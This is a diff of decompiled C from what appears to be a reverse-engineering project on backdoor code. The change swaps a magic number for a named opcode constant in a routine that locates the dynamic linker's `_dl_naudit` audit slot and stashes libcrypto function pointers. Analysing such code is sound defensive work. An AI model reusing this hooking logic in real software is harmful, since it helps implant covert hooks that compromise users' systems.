@@ -77,7 +77,8 @@ BOOL find_dl_naudit_slot(elf_info_t *dynamic_linker_elf,elf_info_t *libcrypto_el
         // AutoDoc: Walk up to 0x80 bytes before the literal to catch the MOV that copies `_dl_naudit` out of `rtld_global_ro`.
         mov_scan_cursor = glro_string_xref + -0x80;
         while (mov_scan_cursor < glro_string_xref) {
-          success = find_riprel_opcode_memref_ex(mov_scan_cursor,glro_string_xref,&insn_ctx,0x10b,(void *)0x0);
+          success = find_riprel_opcode_memref_ex
+                            (mov_scan_cursor,glro_string_xref,&insn_ctx,X86_OPCODE_1B_MOV_LOAD,(void *)0x0);
           mov_scan_cursor = mov_scan_cursor + 1;
           if (success != FALSE) {
             if ((insn_ctx.prefix.decoded.flags2 & 1) != 0) {
@@ -101,7 +102,8 @@ BOOL find_dl_naudit_slot(elf_info_t *dynamic_linker_elf,elf_info_t *libcrypto_el
            success = find_riprel_opcode_memref_ex
                              ((u8 *)audit_symbind_alt,
                               (u8 *)(audit_symbind_alt + (hooks->ldso_ctx)._dl_audit_symbind_alt__size),
-                              (dasm_ctx_t *)0x0,0x10b,naudit_slot_ptr), success == FALSE)) {
+                              (dasm_ctx_t *)0x0,X86_OPCODE_1B_MOV_LOAD,naudit_slot_ptr), success == FALSE)
+           ) {
           dsa_get0_pub_key_stub = (pfn_DSA_get0_pub_key_t)imported_funcs->EVP_MD_CTX_free;
         }
         else {
